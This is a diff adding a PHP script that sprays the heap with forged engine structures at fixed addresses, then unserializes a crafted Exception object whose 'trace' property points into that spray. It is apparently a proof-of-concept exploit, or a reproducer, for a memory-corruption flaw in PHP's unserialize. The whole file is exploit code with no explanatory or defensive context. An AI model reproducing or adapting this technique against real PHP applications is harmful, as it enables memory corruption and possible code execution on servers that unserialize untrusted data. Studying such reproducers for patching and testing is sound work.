@@ -1,0 +1,120 @@
+<?php
+
+
+ini_set("memory_limit", -1);
+
+setup_memory();
+
+$x = 
+unserialize('O:9:"exception":1:{s:16:"'."\0".'Exception'."\0".'trace";s:'.strlen($hashtable).':"'.$hashtable.'";}');
+
+echo $x, "\n";
+
+function setup_memory()
+{
+        global $str, $hashtable;
+
+        $base = 0x114000000 + 0x20;
+        $bucket_addr = $base;
+        $zval_delta = 0x100;
+        $hashtable_delta = 0x200;
+        $zval_addr = $base + $zval_delta;
+        $hashtable_addr = $base + $hashtable_delta;
+
+        $bucket  = "\x01\x00\x00\x00\x00\x00\x00\x00";
+        $bucket .= "\x00\x00\x00\x00\x00\x00\x00\x00";
+        $bucket .= ptr2str($bucket_addr + 3*8);
+        $bucket .= ptr2str($zval_addr);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+
+        $bucket .= ptr2str(zhash('class'));
+        $bucket .= "\x06\x00\x00\x00\x00\x00\x00\x00";
+        $bucket .= ptr2str($bucket_addr + 3*8 + 9*8);
+        $bucket .= ptr2str($zval_addr + 5*8 + 6);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str(0);
+        $bucket .= ptr2str($zval_addr + 2*5*8 + 2*6);
+        $bucket .= ptr2str($bucket_addr);
+        $bucket .= ptr2str($bucket_addr + 9*8);
+
+        $hashtable  = "\x00\x00\x00\x00";
+        $hashtable .= "\x01\x00\x00\x00";
+        $hashtable .= "\x03\x00\x00\x00";
+        $hashtable .= "\x00\x00\x00\x00";
+        $hashtable .= "\x00\x00\x00\x00\x00\x00\x00\x00";
+        $hashtable .= ptr2str(0);
+        $hashtable .= ptr2str($bucket_addr);
+        $hashtable .= ptr2str($bucket_addr + 9*8);
+        $hashtable .= ptr2str($bucket_addr + 18*8);
+        $hashtable .= ptr2str(0);
+        $hashtable .= "\x00";
+        $hashtable .= "\x00";
+
+        $zval = ptr2str($hashtable_addr);
+        $zval .= ptr2str(0);
+        $zval .= "\x00\x00\x00\x00";
+        $zval .= "\x04";
+        $zval .= "\x00";
+        $zval .= ptr2str(0);
+        $zval .= ptr2str(0);
+        $zval .= ptr2str(0);
+
+        $zval .= ptr2str(0x100352572);
+        $zval .= ptr2str(0x16);
+        $zval .= "\x00\x00\x00\x00";
+        $zval .= "\x06";
+        $zval .= "\x00";
+        $zval .= ptr2str(0);
+        $zval .= ptr2str(0);
+        $zval .= ptr2str(0);
+
+        $zval .= ptr2str(hexdec(bin2hex(strrev('class'))));
+
+        $part = str_repeat("\x73", 4096);
+        for ($j = 0; $j < strlen($bucket); $j++) {
+                $part[$j] = $bucket[$j];
+        }
+        for ($j = 0; $j < strlen($hashtable); $j++) {
+                $part[$j + $hashtable_delta] = $hashtable[$j];
+        }
+        for ($j = 0; $j < strlen($zval); $j++) {
+                $part[$j + $zval_delta] = $zval[$j];
+        }
+        $str = str_repeat($part, 1024*1024*256/4096);
+}
+
+function ptr2str($ptr)
+{
+        $out = "";
+        for ($i=0; $i<8; $i++) {
+                $out .= chr($ptr & 0xff);
+                $ptr >>= 8;
+        }
+        return $out;
+}
+
+function zhash($key)
+{
+        $hash = 5381;
+        $key = $key;
+        $len = strlen($key) + 1;
+        
+        for (; $len >= 8; $len -= 8) {
+                for ($i = 0; $i < 8; $i++) {
+                        $hash = (($hash << 5) + $hash) + ord($key{$i});
+        }
+        }
+        $key = substr($key, -$len);
+        for ($i = 0; $i < $len; $i++) {
+                $hash = (($hash << 5) + $hash) + ord($key{$i});
+        }
+        return $hash;
+}
+
+?>
